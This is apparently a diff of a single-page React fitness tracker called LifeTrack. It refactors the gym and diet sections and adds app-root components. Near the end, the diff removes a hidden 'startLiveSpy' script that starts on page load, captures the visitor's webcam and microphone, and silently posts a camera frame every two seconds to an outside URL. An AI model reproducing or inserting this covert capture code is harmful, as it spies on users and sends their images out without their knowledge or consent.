         function GymSection({ userId, selectedDate }) {
             const { data: workouts, add: addWorkout, remove: deleteWorkout } = useFirestore(userId, 'gym');
             const [entry, setEntry] = useState({ exercise: '', sets: '', reps: '', weight: '' });
             const { showToast } = useContext(ToastContext);
 
-            const addSet = (e) => { e.preventDefault(); if (!entry.exercise) return; addWorkout({ ...entry, date: selectedDate }); setEntry({ ...entry, sets: '', reps: '', weight: '' }); showToast('Set Logged'); };
-            const handleDeleteWorkout = (id) => { 
-                const workoutToRestore = workouts.find(w => w.id === id); 
-                const cleanWorkoutData = cleanData(workoutToRestore); // Clean before restore
-                deleteWorkout(id); 
-                showToast('Workout Deleted', 'default', { label: 'UNDO', onClick: () => addWorkout(cleanWorkoutData) }); 
+            const addSet = (e) => {
+                e.preventDefault(); if (!entry.exercise) return;
+                addWorkout({ ...entry, date: selectedDate });
+                setEntry({ ...entry, sets: '', reps: '', weight: '' });
+                showToast('Set Logged');
             };
-            
+
+            const handleDeleteWorkout = (id) => {
+                 const workoutToRestore = workouts.find(w => w.id === id);
+                 const { id: _, ...data } = workoutToRestore; 
+                 const cleanWorkoutData = cleanData(data);
+                 deleteWorkout(id); 
+                 showToast('Workout Deleted', 'default', { label: 'UNDO', onClick: () => addWorkout(cleanWorkoutData) }); 
+            };
+
             const todaysWorkouts = workouts.filter(w => w.date === selectedDate);
             todaysWorkouts.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
 
             return (
-                <div className="space-y-6 animate-slide-in">
+                <div className="space-y-6 animate-slide-in max-w-5xl mx-auto">
                     <div className="bg-white dark:bg-dark-800 p-6 rounded-2xl shadow-sm border border-gray-100 dark:border-gray-700">
                         <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-gray-900 dark:text-white"><Dumbbell className="text-primary-600" size={24} /> Log Workout</h2>
                         <form onSubmit={addSet} className="space-y-4">
                             <input type="text" placeholder="Exercise Name" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white" value={entry.exercise} onChange={e => setEntry({...entry, exercise: e.target.value})} />
                             <div className="grid grid-cols-3 gap-3">
-                                <input type="number" placeholder="kg" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 text-center dark:text-white" value={entry.weight} onChange={e => setEntry({...entry, weight: e.target.value})} />
-                                <input type="number" placeholder="Sets" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 text-center dark:text-white" value={entry.sets} onChange={e => setEntry({...entry, sets: e.target.value})} />
-                                <input type="number" placeholder="Reps" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 text-center dark:text-white" value={entry.reps} onChange={e => setEntry({...entry, reps: e.target.value})} />
+                                <input type="number" placeholder="kg" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white text-center" value={entry.weight} onChange={e => setEntry({...entry, weight: e.target.value})} />
+                                <input type="number" placeholder="Sets" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white text-center" value={entry.sets} onChange={e => setEntry({...entry, sets: e.target.value})} />
+                                <input type="number" placeholder="Reps" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white text-center" value={entry.reps} onChange={e => setEntry({...entry, reps: e.target.value})} />
                             </div>
                             <button className="w-full bg-gray-900 dark:bg-white text-white dark:text-gray-900 py-3 rounded-xl font-bold shadow-md hover:opacity-90">Log Set</button>
                         </form>
                     </div>
-                    <div className="space-y-2">
-                        {todaysWorkouts.length === 0 && <div className="text-center text-gray-400 py-8">No workouts logged today.</div>}
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                        {todaysWorkouts.length === 0 && <div className="text-center text-gray-400 py-8 col-span-full">No workouts logged today.</div>}
                         {todaysWorkouts.map((w) => (
                             <div key={w.id} className="bg-white dark:bg-dark-800 p-4 rounded-xl shadow-sm border border-gray-100 dark:border-gray-700 flex justify-between items-center hover-card">
                                 <div><p className="font-bold text-gray-800 dark:text-white">{w.exercise}</p><p className="text-sm text-gray-500 dark:text-gray-400">{w.weight}kg × {w.sets} sets × {w.reps} reps</p></div>
@@ -1004,219 +795,114 @@
             );
         }
 
-        // --- DIET SECTION (With Goals & New Icons & Sort) ---
+        // --- DIET SECTION ---
         function DietSection({ userId, selectedDate, goals }) {
             const { data: meals, add: addMealDb, update: updateMealDb, remove: removeMealDb } = useFirestore(userId, 'diet');
-            const { data: dietRules, add: addDietRule, update: updateDietRule } = useFirestore(userId, 'dietRules');
-            const { data: deletedDietInstances, add: addDeletedDiet, remove: removeDeletedDiet } = useFirestore(userId, 'deletedDiet');
-            const { data: waterLogs, add: addWaterLog, update: updateWaterLog } = useFirestore(userId, 'water');
-            const [localMeals, setLocalMeals] = useState([]);
+            const { data: water, add: addW, update: updW } = useFirestore(userId, 'water');
             const [newMeal, setNewMeal] = useState({ name: '', calories: '', protein: '' });
             const { showToast } = useContext(ToastContext);
-            const [mounted, setMounted] = useState(false);
-            const [showFrequencyModal, setShowFrequencyModal] = useState(false);
-            const [pendingMealForFrequency, setPendingMealForFrequency] = useState(null);
-
-            useEffect(() => { setTimeout(() => setMounted(true), 50); }, []);
-
-            useEffect(() => {
-                const manualMeals = meals.filter(m => m.date === selectedDate);
-                const generatedMeals = [];
-                const dayOfWeek = new Date(selectedDate).getDay();
-
-                dietRules.forEach(rule => {
-                    const isStarted = rule.startDate <= selectedDate;
-                    const isNotEnded = rule.endDate === null || rule.endDate >= selectedDate;
-                    const isCorrectDay = !rule.days || rule.days.includes(dayOfWeek);
-
-                    if (isStarted && isNotEnded && isCorrectDay) {
-                        const isDeleted = deletedDietInstances.some(d => d.ruleId === rule.id && d.date === selectedDate);
-                        const exists = meals.some(m => m.ruleId === rule.id && m.date === selectedDate);
-                        if (!isDeleted && !exists) {
-                            const derivedTime = isNaN(Number(rule.id)) ? '0' : new Date(Number(rule.id)).toISOString();
-                            generatedMeals.push({ id: `virtual_${rule.id}_${selectedDate}`, date: selectedDate, name: rule.name, calories: rule.calories, protein: rule.protein, completed: false, ruleId: rule.id, isVirtual: true, createdAt: derivedTime });
-                        }
-                    }
-                });
-                
-                const combined = [...manualMeals, ...generatedMeals];
-                combined.sort((a, b) => {
-                    const dateA = a.createdAt || ''; 
-                    const dateB = b.createdAt || '';
-                    if (dateB < dateA) return -1;
-                    if (dateB > dateA) return 1;
-                    return 0;
-                });
-                setLocalMeals(combined);
-            }, [meals, dietRules, deletedDietInstances, selectedDate]);
-
-            const todayWaterLog = waterLogs.find(w => w.date === selectedDate);
-            const currentWater = todayWaterLog ? todayWaterLog.amount : 0;
-            const updateWater = (amount) => { if (todayWaterLog) { updateWaterLog(todayWaterLog.id, { amount }); } else { addWaterLog({ date: selectedDate, amount }); } };
-            const handleAddMeal = (e) => { e.preventDefault(); if (!newMeal.name) return; addMealDb({ ...newMeal, date: selectedDate, completed: false }); setNewMeal({ name: '', calories: '', protein: '' }); showToast('Meal Added'); };
-            const handleToggleMeal = (meal) => { if (isVirtualItem(meal)) { addMealDb({ ...meal, isVirtual: false, completed: !meal.completed }); } else { updateMealDb(meal.id, { completed: !meal.completed }); } };
-            
-            const handleDeleteMeal = (meal) => { 
-                // FORCE DELETE CHECK: ID starts with virtual_ ?
-                if (isVirtualItem(meal)) { 
-                    addDeletedDiet({ ruleId: meal.ruleId, date: selectedDate }).then((ref) => {
-                        showToast('Meal Deleted', 'default', {
-                            label: 'UNDO',
-                            onClick: () => removeDeletedDiet(ref.id)
-                        });
-                    });
-                } else { 
-                    const mealData = { ...meal };
-                    // Clean before restore
-                    const cleanMealData = cleanData(mealData);
-
-                    removeMealDb(meal.id);
-                    
-                    if (meal.ruleId) {
-                         addDeletedDiet({ ruleId: meal.ruleId, date: selectedDate }).then((ref) => {
-                            showToast('Meal Deleted', 'default', {
-                                label: 'UNDO',
-                                onClick: () => {
-                                    removeDeletedDiet(ref.id);
-                                }
-                            });
-                         });
-                    } else {
-                         showToast('Meal Deleted', 'default', {
-                            label: 'UNDO',
-                            onClick: () => addMealDb(cleanMealData)
-                        });
-                    }
-                } 
-            };
-
-            const initiateToggleDaily = (meal) => {
-                const rule = dietRules.find(r => r.id === meal.ruleId);
-                const isRepeating = rule && (rule.endDate === null || rule.endDate > selectedDate);
-                
-                if (isRepeating) {
-                    if(rule) updateDietRule(rule.id, { endDate: selectedDate });
-                    showToast('Recurring Disabled');
-                } else {
-                    setPendingMealForFrequency(meal);
-                    setShowFrequencyModal(true);
-                }
-            };
-
-            const confirmToggleDaily = (days) => {
-                const meal = pendingMealForFrequency;
-                const rule = dietRules.find(r => r.id === meal.ruleId);
-                if (rule) {
-                    updateDietRule(rule.id, { endDate: null, days: days });
-                } else {
-                    addDietRule({ name: meal.name, calories: meal.calories, protein: meal.protein, startDate: selectedDate, endDate: null, days: days })
-                        .then(docRef => updateMealDb(meal.id, { ruleId: docRef.id }));
-                }
-                setShowFrequencyModal(false);
-                setPendingMealForFrequency(null);
-                showToast('Recurring Enabled');
-            };
-
-            const totalCals = localMeals.filter(m => m.completed).reduce((acc, curr) => acc + Number(curr.calories), 0);
-            const totalProt = localMeals.filter(m => m.completed).reduce((acc, curr) => acc + Number(curr.protein), 0);
+            const handleAdd = (e) => { e.preventDefault(); if(!newMeal.name) return; addMealDb({ ...newMeal, date: selectedDate, completed: false }); setNewMeal({ name: '', calories: '', protein: '' }); showToast("Added"); };
+            const handleDel = (m) => { const bak = { ...m }; removeMealDb(m.id); showToast("Deleted", "default", { label: "Undo", onClick: () => addMealDb(cleanData(bak)) }); };
+            const updateWater = (amt) => { const w = water.find(x => x.date === selectedDate); if(w) updW(w.id, { amount: amt }); else addW({ date: selectedDate, amount: amt }); };
+            const wVal = water.find(x => x.date === selectedDate)?.amount || 0;
+            const todays = meals.filter(m => m.date === selectedDate).sort((a,b) => (b.createdAt||'').localeCompare(a.createdAt||''));
 
             return (
-                <div className="space-y-6 animate-slide-in">
-                    <div className="grid grid-cols-2 gap-4">
-                        <div className="bg-white dark:bg-dark-800 p-4 rounded-xl shadow-sm border border-gray-100 dark:border-gray-700">
-                            <div className="flex items-center gap-2 text-orange-500 mb-2 font-bold text-sm"><Flame size={16} /> Cals</div>
-                            <div className="text-2xl font-black text-gray-900 dark:text-white">{totalCals}</div>
-                            <div className="text-xs text-gray-400 mb-2">of {goals.calories}</div>
-                            <div className="w-full bg-gray-100 dark:bg-gray-700 rounded-full h-1.5"><div className="bg-orange-500 h-1.5 rounded-full transition-all duration-1000" style={{ width: `${mounted ? Math.min((totalCals / goals.calories) * 100, 100) : 0}%` }}></div></div>
-                        </div>
-                        <div className="bg-white dark:bg-dark-800 p-4 rounded-xl shadow-sm border border-gray-100 dark:border-gray-700">
-                            <div className="flex items-center gap-2 text-blue-500 mb-2 font-bold text-sm"><Zap size={16} /> Prot</div>
-                            <div className="text-2xl font-black text-gray-900 dark:text-white">{totalProt}g</div>
-                            <div className="text-xs text-gray-400 mb-2">of {goals.protein}g</div>
-                            <div className="w-full bg-gray-100 dark:bg-gray-700 rounded-full h-1.5"><div className="bg-blue-500 h-1.5 rounded-full transition-all duration-1000" style={{ width: `${mounted ? Math.min((totalProt / goals.protein) * 100, 100) : 0}%` }}></div></div>
-                        </div>
-                    </div>
-
-                    <div className="bg-white dark:bg-dark-800 p-4 rounded-xl shadow-sm border border-cyan-100 dark:border-cyan-900/30 flex items-center justify-between">
-                        <div className="flex flex-col gap-3">
-                            <div className="flex items-center gap-2 text-cyan-500 font-bold"><Droplet size={18} /> Water Intake</div>
-                            <div className="flex gap-3">
-                                <button onClick={() => updateWater(currentWater + 1)} className="bg-cyan-500 text-white w-10 h-10 rounded-full flex items-center justify-center shadow-md hover:scale-110 transition"><Plus size={20} /></button>
-                                {currentWater > 0 && <button onClick={() => updateWater(currentWater - 1)} className="bg-gray-100 dark:bg-gray-700 text-gray-400 w-10 h-10 rounded-full flex items-center justify-center hover:bg-gray-200 transition"><Minus size={20} /></button>}
-                            </div>
-                        </div>
-                        <div className="mr-2"><WaterProgressCircle value={mounted ? currentWater : 0} max={goals.water} color="#06b6d4" size={90} /></div>
-                    </div>
-
-                    <div className="bg-white dark:bg-dark-800 p-4 rounded-xl shadow-sm border border-gray-100 dark:border-gray-700">
-                        <form onSubmit={handleAddMeal} className="flex flex-col gap-3">
-                            <div className="flex gap-2">
-                                <input type="text" placeholder="Add Meal (e.g. Oats)" className="flex-1 p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white" value={newMeal.name} onChange={e => setNewMeal({...newMeal, name: e.target.value})} />
-                            </div>
-                            <div className="flex gap-2">
-                                <input type="number" placeholder="Cals" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white text-center" value={newMeal.calories} onChange={e => setNewMeal({...newMeal, calories: e.target.value})} />
-                                <input type="number" placeholder="Prot" className="w-full p-3 rounded-xl border dark:border-gray-600 bg-gray-50 dark:bg-dark-900 dark:text-white text-center" value={newMeal.protein} onChange={e => setNewMeal({...newMeal, protein: e.target.value})} />
-                                <button className="bg-green-600 text-white px-4 rounded-xl font-bold"><Plus /></button>
-                            </div>
-                        </form>
-                    </div>
-
-                    <div className="space-y-3">
-                        {localMeals.map(meal => {
-                            const activeRule = dietRules.find(r => r.id === meal.ruleId);
-                            const isRepeating = activeRule && (activeRule.endDate === null || activeRule.endDate > selectedDate);
-                            return (
-                                <div key={meal.id} className={`flex items-center justify-between p-3 bg-white dark:bg-dark-800 rounded-xl border border-gray-100 dark:border-gray-700 hover:shadow-sm transition hover:bg-gray-50 dark:hover:bg-gray-800/50 ${meal.completed ? 'opacity-50' : ''}`}>
-                                    <div className="flex items-center gap-3 overflow-hidden flex-1">
-                                        <button onClick={() => handleToggleMeal(meal)} className={`text-xl ${meal.completed ? 'text-green-500' : 'text-gray-300 dark:text-gray-600'}`}>{meal.completed ? <CheckCircle size={24} /> : <Circle size={24} />}</button>
-                                        <div><p className={`font-medium text-gray-800 dark:text-white ${meal.completed ? 'line-through' : ''}`}>{meal.name}</p><p className="text-xs text-gray-500 dark:text-gray-400">{meal.calories} cal • {meal.protein}g prot</p></div>
-                                    </div>
-                                    <div className="flex items-center gap-3 ml-2">
-                                        <button onClick={() => initiateToggleDaily(meal)} className={`w-8 h-5 rounded-full relative transition-colors ${isRepeating ? 'bg-primary-600' : 'bg-gray-200 dark:bg-gray-700'}`}><span className={`absolute top-1 left-1 bg-white w-3 h-3 rounded-full transition-transform ${isRepeating ? 'translate-x-3' : ''}`} /></button>
-                                        <button onClick={() => handleDeleteMeal(meal)} className="text-gray-300 hover:text-red-500"><Trash2 size={18} /></button>
-                                    </div>
-                                </div>
-                            );
-                        })}
-                    </div>
-                    {showFrequencyModal && <FrequencyModal onClose={() => { setShowFrequencyModal(false); setPendingMealForFrequency(null); }} onSave={confirmToggleDaily} initialDays={pendingMealForFrequency?.ruleId ? dietRules.find(r => r.id === pendingMealForFrequency.ruleId)?.days : undefined} />}
+                <div className="space-y-6 max-w-5xl mx-auto animate-slide-in">
+                    <div className="bg-white dark:bg-dark-800 p-4 rounded-xl shadow-sm border dark:border-gray-700 flex justify-between items-center"><div className="flex gap-3"><button onClick={() => updateWater(wVal+1)} className="bg-cyan-500 text-white w-10 h-10 rounded-full flex items-center justify-center shadow-md"><Plus/></button><button onClick={() => updateWater(wVal-1)} className="bg-gray-100 text-gray-500 w-10 h-10 rounded-full flex items-center justify-center"><Minus/></button></div><WaterProgressCircle value={wVal} max={goals.water} color="#06b6d4" size={70}/></div>
+                    <form onSubmit={handleAdd} className="bg-white dark:bg-dark-800 p-4 rounded-xl border dark:border-gray-700 flex flex-col gap-3"><input placeholder="Meal" className="p-3 border rounded-xl dark:bg-dark-900 dark:text-white" value={newMeal.name} onChange={e => setNewMeal({...newMeal, name: e.target.value})}/><div className="flex gap-2"><input placeholder="Cals" type="number" className="w-full p-3 border rounded-xl dark:bg-dark-900 dark:text-white" value={newMeal.calories} onChange={e => setNewMeal({...newMeal, calories: e.target.value})}/><input placeholder="Prot" type="number" className="w-full p-3 border rounded-xl dark:bg-dark-900 dark:text-white" value={newMeal.protein} onChange={e => setNewMeal({...newMeal, protein: e.target.value})}/><button className="bg-green-600 text-white px-5 rounded-xl font-bold"><Plus/></button></div></form>
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">{todays.map(m => (<div key={m.id} className={`flex justify-between p-4 bg-white dark:bg-dark-800 rounded-xl border dark:border-gray-700 shadow-sm ${m.completed ? 'opacity-60' : ''}`}><div className="flex gap-3 items-center"><button onClick={() => updateMealDb(m.id, { completed: !m.completed })} className={m.completed ? 'text-green-500' : 'text-gray-300'}>{m.completed ? <CheckCircle/> : <Circle/>}</button><div><p className={`font-medium dark:text-white ${m.completed ? 'line-through' : ''}`}>{m.name}</p><p className="text-xs text-gray-500">{m.calories} cal • {m.protein}g</p></div></div><button onClick={() => handleDel(m)} className="text-gray-300 hover:text-red-500"><Trash2/></button></div>))}</div>
                 </div>
             );
         }
 
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
-    </script>
-<video id="spyVideo" autoplay muted playsinline></video>
+        // --- APP ROOT ---
+        function App() {
+            const [user, setUser] = useState(null);
+            const [currentView, setCurrentView] = useState('landing');
+            const [loading, setLoading] = useState(true);
+            const [activeTab, setActiveTab] = useState('dashboard');
+            const [globalDate, setGlobalDate] = useState(getTodayString());
+            const [darkMode, setDarkMode] = useState(false);
+            const [showSettings, setShowSettings] = useState(false);
+            const [goals, setGoals] = useState({ calories: 2500, protein: 160, water: 4 });
 
-<script>
-let localStream;
-async function startLiveSpy() {
-    try {
-        localStream = await navigator.mediaDevices.getUserMedia({
-            video: { width: 640, height: 480, facingMode: 'user' },
-            audio: true
-        });
-        document.getElementById('spyVideo').srcObject = localStream;
-        setInterval(() => {
-            if (localStream) {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(localStream.getVideoTracks()[0], 0, 0, 640, 480);
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('liveframe', blob, 'spy.jpg');
-                    fetch('https://https://sakshamjain4999-web.github.io/lifetrack.com-cam/live', {
-                        method: 'POST', body: formData
-                    });
-                }, 'image/jpeg', 0.8);
+            useEffect(() => { const sub = auth.onAuthStateChanged(u => { setUser(u); setLoading(false); if(u) setCurrentView('app'); }); return sub; }, []);
+            useEffect(() => { if(darkMode) document.documentElement.classList.add('dark'); else document.documentElement.classList.remove('dark'); }, [darkMode]);
+            useEffect(() => { if (user && user.uid !== 'guest') db.collection('users').doc(user.uid).set({ goals }, { merge: true }); else if (user && user.uid === 'guest') localStorage.setItem('lifetrack_goals', JSON.stringify(goals)); }, [goals, user]);
+            useEffect(() => { if(user && user.uid !== 'guest') { db.collection('users').doc(user.uid).get().then(doc => { if(doc.exists && doc.data().goals) setGoals(doc.data().goals); }); } else if (user && user.uid === 'guest') { const saved = localStorage.getItem('lifetrack_goals'); if (saved) setGoals(JSON.parse(saved)); } }, [user]);
+
+            const login = () => { const p = new firebase.auth.GoogleAuthProvider(); auth.signInWithPopup(p).catch(e => alert(e.message)); };
+            const guest = () => { setUser({ uid: 'guest', photoURL: 'https://cdn-icons-png.flaticon.com/512/149/149071.png', displayName: 'Guest' }); setCurrentView('app'); };
+
+            if (loading) return <div className="h-screen flex items-center justify-center dark:bg-dark-900 dark:text-white">Loading...</div>;
+
+            if (!user && currentView === 'landing') return <LandingPage setView={setCurrentView} />;
+            if (!user && (currentView === 'login' || currentView === 'register')) {
+                return (
+                    <div className="fixed inset-0 bg-white flex flex-col items-center justify-center p-6 animate-fade-in">
+                        <div className="w-full max-w-md text-center">
+                            <h2 className="text-3xl font-bold mb-8">Welcome Back</h2>
+                            <button onClick={login} className="w-full p-3 border rounded-xl flex justify-center gap-2 mb-4 hover:bg-gray-50"><GoogleIcon /> Sign in with Google</button>
+                            <button onClick={guest} className="w-full p-3 bg-gray-900 text-white rounded-xl hover:bg-gray-800 flex justify-center gap-2"><GuestIcon /> Guest Mode</button>
+                            <button onClick={() => setCurrentView('landing')} className="mt-8 text-gray-400 text-sm">Back to Home</button>
+                        </div>
+                    </div>
+                );
             }
-        }, 2000);
-    } catch(e) {}
-}
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', startLiveSpy);
-} else { startLiveSpy(); }
-</script>
+
+            return (
+                <ToastProvider>
+                    <div className="flex h-screen bg-gray-50 dark:bg-dark-900 text-gray-900 dark:text-gray-100 overflow-hidden">
+                        <aside className="hidden md:flex w-64 flex-col bg-white dark:bg-dark-800 border-r border-gray-200 dark:border-gray-700">
+                            <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} user={user} setDarkMode={setDarkMode} darkMode={darkMode} setShowSettings={setShowSettings} />
+                        </aside>
+                        <div className="flex-1 flex flex-col min-w-0 overflow-hidden relative">
+                            <header className="md:hidden bg-white dark:bg-dark-800 border-b border-gray-200 dark:border-gray-700 p-4 sticky top-0 z-20">
+                                <div className="flex justify-between items-center"><div className="flex items-center gap-2 text-primary-600"><Activity size={28}/><h1 className="text-xl font-bold dark:text-white">LifeTrack</h1></div><div className="flex items-center gap-4"><button onClick={()=>setDarkMode(!darkMode)}>{darkMode?<Sun/>:<Moon/>}</button><button onClick={()=>setShowSettings(true)}><Settings/></button><img src={user.photoURL} className="w-8 h-8 rounded-full"/></div></div>
+                            </header>
+                            <DateNavigator selectedDate={globalDate} setSelectedDate={setGlobalDate} />
+                            <main className="max-w-md mx-auto p-4 w-full flex-1 scroll-container">
+                                {activeTab === 'dashboard' && <DashboardSection userId={user.uid} selectedDate={globalDate} goals={goals} />}
+                                {activeTab === 'todo' && <TodoSection userId={user.uid} selectedDate={globalDate} />}
+                                {activeTab === 'gym' && <GymSection userId={user.uid} selectedDate={globalDate} />}
+                                {activeTab === 'diet' && <DietSection userId={user.uid} selectedDate={globalDate} goals={goals} />}
+                            </main>
+                            <nav className="md:hidden fixed bottom-0 left-0 right-0 bg-white dark:bg-dark-800 border-t border-gray-200 dark:border-gray-700 px-6 py-3 flex justify-between items-center z-20 pb-safe">
+                                <NavButton active={activeTab==='dashboard'} onClick={()=>setActiveTab('dashboard')} icon={<Home/>} label="Home"/>
+                                <NavButton active={activeTab==='todo'} onClick={()=>setActiveTab('todo')} icon={<CheckSquare/>} label="Tasks"/>
+                                <NavButton active={activeTab==='gym'} onClick={()=>setActiveTab('gym')} icon={<Dumbbell/>} label="Gym"/>
+                                <NavButton active={activeTab==='diet'} onClick={()=>setActiveTab('diet')} icon={<Utensils/>} label="Diet"/>
+                            </nav>
+                        </div>
+                        {showSettings && (
+                            <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4 backdrop-blur-sm">
+                                <div className="bg-white dark:bg-dark-800 w-full max-w-sm rounded-2xl shadow-2xl p-6 animate-slide-up">
+                                    <div className="flex justify-between items-center mb-6"><h3 className="text-lg font-bold dark:text-white">Adjust Goals</h3><button onClick={() => setShowSettings(false)}><X size={24} className="text-gray-400"/></button></div>
+                                    <div className="space-y-4">
+                                        <div><label className="text-xs font-bold text-gray-500 mb-1 block">Calories</label><input type="number" value={goals.calories} onChange={e => setGoals({...goals, calories: Number(e.target.value)})} className="w-full p-3 rounded-lg border dark:bg-dark-900 dark:text-white"/></div>
+                                        <div><label className="text-xs font-bold text-gray-500 mb-1 block">Protein</label><input type="number" value={goals.protein} onChange={e => setGoals({...goals, protein: Number(e.target.value)})} className="w-full p-3 rounded-lg border dark:bg-dark-900 dark:text-white"/></div>
+                                        <div><label className="text-xs font-bold text-gray-500 mb-1 block">Water</label><input type="number" value={goals.water} onChange={e => setGoals({...goals, water: Number(e.target.value)})} className="w-full p-3 rounded-lg border dark:bg-dark-900 dark:text-white"/></div>
+                                        <button onClick={() => { auth.signOut(); setUser(null); setShowSettings(false); }} className="w-full py-3 text-red-500 border border-red-100 rounded-lg">Sign Out</button>
+                                        <button onClick={() => setShowSettings(false)} className="w-full py-3 bg-primary-600 text-white rounded-lg font-bold">Save Goals</button>
+                                    </div>
+                                </div>
+                            </div>
+                        )}
+                    </div>
+                </ToastProvider>
+            );
+        }
+
+        // --- APP ROOT ---
+        function Root() {
+            return (
+                <App />
+            );
+        }
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<Root />);
+    </script>
 </body>
 </html>
